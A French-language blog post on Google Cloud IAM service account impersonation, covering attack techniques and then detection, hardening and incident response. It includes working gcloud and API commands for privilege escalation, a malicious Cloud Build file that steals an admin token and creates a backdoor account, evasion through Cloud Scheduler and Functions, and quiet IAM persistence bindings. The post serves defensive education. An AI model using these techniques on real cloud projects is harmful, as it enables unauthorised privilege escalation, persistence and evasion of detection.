---
title: "Exploitation IAM de Google Cloud : Attaques par Impersonation de Comptes de Service"
seoTitle: "Google IAM: Service Account Exploitation"
seoDescription: "Sécurisez Google Cloud IAM avec des stratégies avancées contre l'usurpation de comptes de service et l'escalade de privilèges"
datePublished: Fri Sep 12 2025 14:01:55 GMT+0000 (Coordinated Universal Time)
cuid: cmfgwoy1d000102jyaji94kl0
slug: exploitation-iam-de-google-cloud-attaques-par-impersonation-de-comptes-de-service
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1757614479810/20123851-0b0c-4fd3-86bd-86e06940aa2c.webp
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1757614512234/bcac262a-a5e5-4f2b-83c5-2f55b9a67ce2.webp
tags: cloud-computing, gcp, iam, cloud-security, iammfaaccess-key-idsecret-access-key

---

L'Identity and Access Management (IAM) de Google Cloud Platform représente un élément central de la sécurité cloud, contrôlant l'accès aux ressources à travers un système complexe de rôles et de permissions. Cependant, lorsque les politiques IAM sont mal configurées, elles peuvent créer des vecteurs d'attaque critiques permettant aux attaquants d'escalader leurs privilèges via l'impersonation de comptes de service. Cette analyse technique approfondie explore les mécanismes d'exploitation de l'IAM GCP, les techniques d'impersonation avancées, et les stratégies de défense robustes.

![Diagram showing GCP service account impersonation in Terraform, illustrating access control delegation from a developer through IAM user to service accounts and GCP resources](https://img.youtube.com/vi/Ec3H-prRVQ0/maxresdefault.jpg align="left")

## Compréhension de l'Impersonation de Comptes de Service GCP

L'impersonation de comptes de service dans Google Cloud permet à un principal authentifié (utilisateur ou autre compte de service) d'assumer temporairement l'identité d'un compte de service pour accéder aux ressources auxquelles ce compte a accès. Cette fonctionnalité, bien qu'utile pour la gestion des privilèges et le développement, peut devenir un vecteur d'escalade de privilèges lorsqu'elle est mal implémentée.

### Architecture de l'Impersonation

L'impersonation de comptes de service implique toujours deux identités distinctes :

* **Le principal impersonateur** : L'identité authentifiée qui initie l'impersonation
    
* **Le compte de service cible** : L'identité qui sera impersonnée
    

Le processus d'impersonation suit ces étapes critiques :

1. **Authentification initiale** : Le principal s'authentifie avec ses propres identifiants
    
2. **Demande d'impersonation** : Le principal demande un token pour le compte de service cible
    
3. **Validation des permissions** : GCP vérifie que le principal a les permissions nécessaires
    
4. **Génération du token** : Un token d'accès temporaire est créé pour le compte de service
    
5. **Utilisation du token** : Le principal utilise ce token pour agir en tant que compte de service
    

![Sequence diagram showing token creation and authentication flow using a Google Cloud service account and KeyCloak](https://pplx-res.cloudinary.com/image/upload/v1755933013/pplx_project_search_images/72a4bfafcb8fee6ab3f8e245adce8628d4e98d0c.png align="left")

### Permissions Critiques pour l'Impersonation

Les permissions suivantes sont essentielles pour l'impersonation de comptes de service :

`iam.serviceAccounts.getAccessToken` : Permet de générer des tokens d'accès OAuth 2.0 pour le compte de service `iam.serviceAccounts.signJwt` : Autorise la signature de tokens JWT avec la clé privée du compte de service  
`iam.serviceAccounts.signBlob` : Permet la signature de données arbitraires `iam.serviceAccounts.implicitDelegation` : Active la délégation implicite entre comptes de service

> 👉 *Note : Ces permissions peuvent aussi être présentes dans des* ***rôles personnalisés*** *(custom roles), pas uniquement dans les rôles natifs comme* `roles/iam.serviceAccountTokenCreator`. Il est donc essentiel de vérifier les permissions effectives des rôles assignés, et pas seulement leurs noms.

## Techniques d'Exploitation Critiques

### 1\. Exploitation du Rôle Service Account Token Creator

Le rôle `roles/iam.serviceAccountTokenCreator` constitue le vecteur d'attaque le plus direct pour l'impersonation de comptes de service. Ce rôle accorde les permissions nécessaires pour générer des tokens d'accès temporaires pour n'importe quel compte de service.

**Exploitation Technique :**

```bash
# Obtenir un token d'accès pour un compte de service privilégié
gcloud auth print-access-token \
    --impersonate-service-account=admin-service@project-id.iam.gserviceaccount.com

# Utiliser le token pour des opérations privilégiées
export ACCESS_TOKEN=$(gcloud auth print-access-token \
    --impersonate-service-account=admin-service@project-id.iam.gserviceaccount.com)

curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://compute.googleapis.com/compute/v1/projects/project-id/zones/zone-id/instances"
```

**Analyse d'Impact :** Cette technique permet une escalade de privilèges immédiate si le compte de service cible dispose de permissions élevées. L'attaquant peut effectuer toutes les actions autorisées par le compte de service sans laisser de traces directes dans ses propres logs d'activité.

### 2\. Attaques par Délégation de Comptes de Service

La permission `iam.serviceAccounts.implicitDelegation` permet un chaînage complexe d'impersonations, créant des chemins d'escalade de privilèges difficiles à détecter.

**Scénario d'Exploitation :**

```bash
# Étape 1 : Impersonation du compte intermédiaire
gcloud config set auth/impersonate_service_account \
    intermediate-service@project-id.iam.gserviceaccount.com

# Étape 2 : Utiliser le compte intermédiaire pour impersonner un compte privilégié
gcloud auth print-access-token \
    --impersonate-service-account=high-privilege-service@project-id.iam.gserviceaccount.com
```

Cette technique de chaînage permet de contourner certaines restrictions de sécurité et de masquer la source originale de l'attaque.

### 3\. Exploitation via les Services de Calcul

Les comptes de service attachés aux instances Compute Engine, aux fonctions Cloud Functions, ou aux services Cloud Run peuvent être exploités pour l'escalade de privilèges.

**Exploitation Compute Engine :**

```bash
# Depuis une instance compromise, obtenir le token du compte de service attaché
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Utiliser le token pour impersonner d'autres comptes de service
curl -X POST \
    -H "Authorization: Bearer $INSTANCE_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"], "lifetime": "3600s"}' \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target-service@project-id.iam.gserviceaccount.com:generateAccessToken"
```

### 4\. Exploitation des Services de Déploiement

Les services comme Cloud Build et Deployment Manager disposent de comptes de service hautement privilégiés qui peuvent être exploités pour l'escalade de privilèges.

**Exploitation Cloud Build :**

```yaml
# cloudbuild.yaml malveillant
steps:
- name: 'gcr.io/cloud-builders/gcloud'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    gcloud auth print-access-token \
        --impersonate-service-account=admin-service@project-id.iam.gserviceaccount.com > /workspace/admin-token.txt
    
    # Utiliser le token pour des actions malveillantes
    export TOKEN=$(cat /workspace/admin-token.txt)
    curl -H "Authorization: Bearer $TOKEN" \
        -X POST \
        "https://iam.googleapis.com/v1/projects/project-id/serviceAccounts/backdoor-service@project-id.iam.gserviceaccount.com"
```

### 5\. Techniques d'Escalade par Tagging

Une technique récemment découverte exploite les conditions IAM basées sur les tags pour escalader les privilèges. Un utilisateur avec les rôles `roles/resourcemanager.tagUser` et `roles/viewer` peut potentiellement obtenir des permissions administratives.

```bash
# 1. Énumérer les politiques IAM conditionnelles
gcloud projects get-iam-policy PROJECT_ID --format=json

# 2. Identifier les tags requis pour satisfaire les conditions
gcloud resource-manager tags values list --parent=tagKeys/TAG_KEY_ID

# 3. Appliquer le tag pour satisfaire la condition IAM
gcloud resource-manager tags bindings create \
    --tag-value=tagValues/TAG_VALUE_ID \
    --parent=//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_NAME

# 4. Exploiter les permissions accordées par la condition
gcloud compute instances delete INSTANCE_NAME --zone=ZONE
```

![Privilege escalation in Google Cloud IAM via tagging technique enables successful service account impersonation and admin operation](https://pplx-res.cloudinary.com/image/upload/v1757610480/pplx_project_search_images/fd765077e96a3b30c9cfc1ffaf76fb5f250f0c5e.png align="left")

> 👉 *Clarification : Cette technique n’est pas un bug de GCP, mais une conséquence de* ***politiques IAM mal conçues****. Si un utilisateur a à la fois la possibilité de gérer des tags (*`roles/resourcemanager.tagUser`) et d’accéder à des ressources protégées par des conditions IAM basées sur ces tags, il peut en abuser pour escalader ses privilèges.

## Techniques de Détection Avancées

### Surveillance des Événements d'Audit

La détection efficace des attaques d'impersonation nécessite une surveillance proactive des événements d'audit spécifiques :

**Événements Critiques à Surveiller :**

* `google.iam.credentials.v1.GenerateAccessToken`
    
* `google.iam.credentials.v1.SignJwt`
    
* `google.iam.credentials.v1.SignBlob`
    
* `google.iam.admin.v1.SetIamPolicy`
    
* `google.iam.admin.v1.CreateServiceAccountKey`
    

**Requête de Détection Cloud Logging :**

```sql
resource.type="service_account"
AND protoPayload.methodName="google.iam.credentials.v1.GenerateAccessToken"
AND protoPayload.authenticationInfo.principalEmail != protoPayload.resourceName
```

### Détection des Anomalies Comportementales

Implémentez des règles de détection basées sur les patterns d'utilisation anormaux :

**Indicateurs d'Anomalie :**

* Génération excessive de tokens d'accès (&gt;10 par heure)
    
* Impersonation depuis des adresses IP non autorisées
    
* Activité d'impersonation en dehors des heures ouvrables
    
* Chaînage d'impersonations multiples
    
* Accès à des ressources inhabituelles après impersonation
    

**Règle de Détection Avancée :**

```yaml
# Règle SIEM pour détecter l'impersonation suspecte
name: "GCP Service Account Impersonation Anomaly"
condition: |
  protoPayload.methodName="GenerateAccessToken" AND
  count(DISTINCT protoPayload.resourceName) > 3 AND
  time_window="1h" AND
  protoPayload.authenticationInfo.principalEmail NOT IN allowed_principals
severity: HIGH
```

### Monitoring en Temps Réel

Configurez des alertes en temps réel pour les activités d'impersonation critiques :

```bash
# Créer une alerte Cloud Monitoring
gcloud alpha monitoring policies create \
    --policy-from-file=impersonation-alert-policy.yaml

# Contenu du fichier d'alerte
cat << EOF > impersonation-alert-policy.yaml
displayName: "Service Account Impersonation Alert"
conditions:
  - displayName: "High frequency impersonation"
    conditionThreshold:
      filter: 'resource.type="service_account" AND protoPayload.methodName="GenerateAccessToken"'
      comparison: COMPARISON_GREATER_THAN
      thresholdValue: 10
      duration: 300s
alertStrategy:
  autoClose: 86400s
notificationChannels: ["notification-channel-id"]
EOF
```

## Stratégies de Défense et Mitigation

### Implémentation de Conditions IAM

Utilisez des conditions IAM pour restreindre l'impersonation selon des critères spécifiques :

```json
{
  "bindings": [
    {
      "role": "roles/iam.serviceAccountTokenCreator",
      "members": ["user:admin@example.com"],
      "condition": {
        "title": "Restriction temporelle et géographique",
        "description": "Autorise l'impersonation uniquement pendant les heures ouvrables depuis des IP autorisées",
        "expression": "request.time.getHours() >= 8 && request.time.getHours() <= 18 && origin.ip in ['192.168.1.0/24', '10.0.0.0/8']"
      }
    }
  ]
}
```

### Principe du Moindre Privilège

Implémentez une stratégie de permissions granulaires :

```bash
# Au lieu d'accorder le rôle au niveau projet
gcloud projects add-iam-policy-binding PROJECT_ID \
    --member="user:admin@example.com" \
    --role="roles/iam.serviceAccountTokenCreator"

# Accordez le rôle uniquement sur des comptes de service spécifiques
gcloud iam service-accounts add-iam-policy-binding \
    specific-service@project.iam.gserviceaccount.com \
    --member="user:admin@example.com" \
    --role="roles/iam.serviceAccountTokenCreator"
```

### Limitation de la Durée de Vie des Tokens

Configurez des durées de vie courtes pour les tokens d'accès :

```python
from google.auth import impersonated_credentials
from google.auth.transport.requests import Request

# Créer des identifiants avec durée de vie limitée (15 minutes)
target_credentials = impersonated_credentials.Credentials(
    source_credentials=source_credentials,
    target_principal="target-service@project.iam.gserviceaccount.com",
    target_scopes=["https://www.googleapis.com/auth/cloud-platform"],
    lifetime=900  # 15 minutes
)
```

### Surveillance Proactive

Implémentez un système de surveillance proactive avec des tableaux de bord personnalisés :

```bash
# Créer un dashboard Cloud Monitoring pour l'impersonation
gcloud monitoring dashboards create \
    --config-from-file=impersonation-dashboard.json

# Configuration du dashboard (extrait)
{
  "displayName": "Service Account Impersonation Monitoring",
  "widgets": [
    {
      "title": "Impersonation Events by Principal",
      "xyChart": {
        "dataSets": [{
          "timeSeriesQuery": {
            "timeSeriesFilter": {
              "filter": "resource.type=\"service_account\" AND protoPayload.methodName=\"GenerateAccessToken\"",
              "aggregation": {
                "alignmentPeriod": "300s",
                "perSeriesAligner": "ALIGN_COUNT"
              }
            }
          }
        }]
      }
    }
  ]
}
```

## Réponse aux Incidents d'Impersonation

### Procédures de Réponse Immédiate

En cas de détection d'une impersonation malveillante :

1. **Isolation Immédiate :**
    

```bash
# Désactiver le compte de service compromis
gcloud iam service-accounts disable \
    compromised-service@project.iam.gserviceaccount.com

# Révoquer tous les tokens actifs
gcloud iam service-accounts keys list \
    --iam-account=compromised-service@project.iam.gserviceaccount.com \
    --format="value(name)" | \
    xargs -I {} gcloud iam service-accounts keys delete {} \
    --iam-account=compromised-service@project.iam.gserviceaccount.com
```

2. **Audit des Permissions :**
    

```bash
# Identifier tous les principals pouvant impersonner le compte
gcloud iam service-accounts get-iam-policy \
    compromised-service@project.iam.gserviceaccount.com \
    --format="table(bindings.members:label=MEMBER,bindings.role:label=ROLE)"
```

3. **Analyse Forensique :**
    

```bash
# Extraire tous les événements d'impersonation des dernières 24h
gcloud logging read \
    'protoPayload.resourceName="projects/-/serviceAccounts/compromised-service@project.iam.gserviceaccount.com" AND timestamp>="2025-01-01T00:00:00Z"' \
    --format=json > forensic_logs.json
```

### Restoration Sécurisée

Procédures pour la restauration sécurisée après incident :

```bash
# 1. Créer un nouveau compte de service
gcloud iam service-accounts create new-secure-service \
    --display-name="Replacement Service Account" \
    --description="Secure replacement for compromised account"

# 2. Appliquer les permissions minimales nécessaires
gcloud projects add-iam-policy-binding PROJECT_ID \
    --member="serviceAccount:new-secure-service@project.iam.gserviceaccount.com" \
    --role="roles/storage.objectViewer"

# 3. Mettre en place des conditions restrictives
gcloud iam service-accounts add-iam-policy-binding \
    new-secure-service@project.iam.gserviceaccount.com \
    --member="user:authorized-admin@example.com" \
    --role="roles/iam.serviceAccountTokenCreator" \
    --condition="expression=request.time.getHours() >= 8 && request.time.getHours() <= 17,title=Business Hours Only"
```

## Techniques d'Évasion Avancées

### Impersonation Indirecte via Services

Les attaquants sophistiqués utilisent des services GCP comme vecteurs d'impersonation pour éviter la détection directe :

**Évasion via Cloud Scheduler :**

```bash
# Créer une tâche planifiée qui effectue l'impersonation
gcloud scheduler jobs create http impersonation-job \
    --schedule="0 2 * * *" \
    --uri="https://cloudfunctions.googleapis.com/v1/projects/project/locations/region/functions/impersonator-function:call" \
    --http-method=POST \
    --headers="Authorization=Bearer $(gcloud auth print-access-token)"
```

**Évasion via Cloud Functions :**

```python
import functions_framework
from google.auth import impersonated_credentials
from google.cloud import storage

@functions_framework.http
def impersonate_and_access(request):
    # Impersonation masquée dans une Cloud Function
    target_credentials = impersonated_credentials.Credentials(
        source_credentials=None,  # Utilise l'identité de la fonction
        target_principal="high-privilege-service@project.iam.gserviceaccount.com",
        target_scopes=["https://www.googleapis.com/auth/cloud-platform"]
    )
    
    # Effectuer des actions privilégiées
    client = storage.Client(credentials=target_credentials)
    # Actions malveillantes masquées...
    
    return "Operation completed", 200
```

> 👉 *Important : Ces scénarios supposent que l’attaquant possède déjà des rôles de déploiement (par ex.* `roles/cloudfunctions.developer` ou `roles/cloudscheduler.admin`). Dans un environnement bien cloisonné, ces permissions ne sont pas toujours disponibles, ce qui limite la faisabilité directe de ces attaques.

### Persistance via Modification de Politiques

Établir la persistance en modifiant subtilement les politiques IAM :

```bash
# Ajouter discrètement une permission d'impersonation
gcloud iam service-accounts add-iam-policy-binding \
    production-service@project.iam.gserviceaccount.com \
    --member="serviceAccount:backup-service@project.iam.gserviceaccount.com" \
    --role="roles/iam.serviceAccountTokenCreator" \
    --condition="title=Backup Operations,description=Allow backup operations,expression=request.time.getDayOfWeek() == 7"
```

> 👉 *À noter : Le risque de persistance est particulièrement élevé lorsque le rôle* `roles/iam.serviceAccountTokenCreator` est accordé à un périmètre large (projet ou organisation entière). La persistance est beaucoup plus limitée si le rôle est restreint à un seul compte de service spécifique.

## Outils et Scripts de Test

### Script d'Audit des Permissions d'Impersonation

```python
#!/usr/bin/env python3
"""
Script d'audit pour identifier les permissions d'impersonation dangereuses
"""
from google.cloud import resource_manager
from google.cloud import iam_v1
import json

def audit_impersonation_permissions(project_id):
    """Audite toutes les permissions d'impersonation dans un projet"""
    
    iam_client = iam_v1.IAMClient()
    resource_name = f"projects/{project_id}"
    
    # Obtenir la politique IAM du projet
    policy = iam_client.get_iam_policy(resource=resource_name)
    
    dangerous_permissions = [
        "iam.serviceAccounts.getAccessToken",
        "iam.serviceAccounts.signJwt",
        "iam.serviceAccounts.signBlob",
        "iam.serviceAccounts.implicitDelegation"
    ]
    
    findings = []
    
    for binding in policy.bindings:
        role = binding.role
        
        # Vérifier si le rôle contient des permissions dangereuses
        if any(perm in role for perm in dangerous_permissions) or \
           role == "roles/iam.serviceAccountTokenCreator":
            
            for member in binding.members:
                finding = {
                    "member": member,
                    "role": role,
                    "condition": binding.condition.expression if binding.condition else "None",
                    "risk_level": "HIGH" if "TokenCreator" in role else "MEDIUM"
                }
                findings.append(finding)
    
    return findings

def main():
    project_id = "your-project-id"
    results = audit_impersonation_permissions(project_id)
    
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
```

### Script de Test de Permissions

```bash
#!/bin/bash
# Script de test des permissions d'impersonation

PROJECT_ID="your-project-id"
SERVICE_ACCOUNT="target-service@${PROJECT_ID}.iam.gserviceaccount.com"

echo "=== Test d'Impersonation de Compte de Service ==="
echo "Projet: $PROJECT_ID"
echo "Compte cible: $SERVICE_ACCOUNT"

# Test 1: Vérifier la permission d'impersonation
echo -n "Test 1 - Permission d'impersonation: "
if gcloud auth print-access-token --impersonate-service-account=$SERVICE_ACCOUNT >/dev/null 2>&1; then
    echo "✓ SUCCÈS - Impersonation possible"
    IMPERSONATION_POSSIBLE=true
else
    echo "✗ ÉCHEC - Impersonation refusée"
    IMPERSONATION_POSSIBLE=false
fi

if [ "$IMPERSONATION_POSSIBLE" = true ]; then
    # Test 2: Tester les permissions du compte impersonné
    echo -n "Test 2 - Énumération des ressources: "
    if gcloud compute instances list --impersonate-service-account=$SERVICE_ACCOUNT >/dev/null 2>&1; then
        echo "✓ SUCCÈS - Accès Compute Engine"
    else
        echo "✗ ÉCHEC - Pas d'accès Compute Engine"
    fi
    
    # Test 3: Tester l'accès aux buckets Storage
    echo -n "Test 3 - Accès Cloud Storage: "
    if gcloud storage buckets list --impersonate-service-account=$SERVICE_ACCOUNT >/dev/null 2>&1; then
        echo "✓ SUCCÈS - Accès Cloud Storage"
    else
        echo "✗ ÉCHEC - Pas d'accès Cloud Storage"
    fi
    
    # Test 4: Tester la génération de tokens JWT
    echo -n "Test 4 - Génération JWT: "
    if gcloud auth print-identity-token --impersonate-service-account=$SERVICE_ACCOUNT >/dev/null 2>&1; then
        echo "✓ SUCCÈS - Génération JWT possible"
    else
        echo "✗ ÉCHEC - Génération JWT refusée"
    fi
fi

echo "=== Fin des tests ==="
```

## Conclusion

L'exploitation IAM de Google Cloud par impersonation de comptes de service représente un vecteur d'attaque sophistiqué qui nécessite une compréhension approfondie des mécanismes d'autorisation et des techniques de défense avancées. Les attaquants peuvent exploiter des configurations IAM apparemment bénignes pour obtenir un accès privilégié, effectuer des mouvements latéraux, et maintenir la persistance dans l'environnement cloud.

La sécurisation efficace contre ces attaques requiert une approche multicouche combinant :

* **Application rigoureuse du principe du moindre privilège** avec des permissions granulaires
    
* **Utilisation extensive des conditions IAM** pour limiter l'usage des permissions critiques
    
* **Surveillance proactive** avec des alertes en temps réel sur les événements d'impersonation
    
* **Audits réguliers** des politiques IAM et des chaînes de permissions
    
* **Formation continue** des équipes sur les dernières techniques d'attaque et de défense
    

L'évolution constante des techniques d'évasion et la sophistication croissante des attaquants rendent essentielle une veille sécuritaire continue et l'adaptation régulière des stratégies de défense. Les organisations doivent traiter l'impersonation de comptes de service non comme une fonctionnalité isolée, mais comme un élément critique de leur posture de sécurité cloud globale.

En implémentant les stratégies de détection et de mitigation présentées dans cette analyse, les équipes de sécurité peuvent significativement réduire leur exposition aux attaques d'impersonation tout en maintenant la flexibilité opérationnelle nécessaire aux environnements cloud modernes.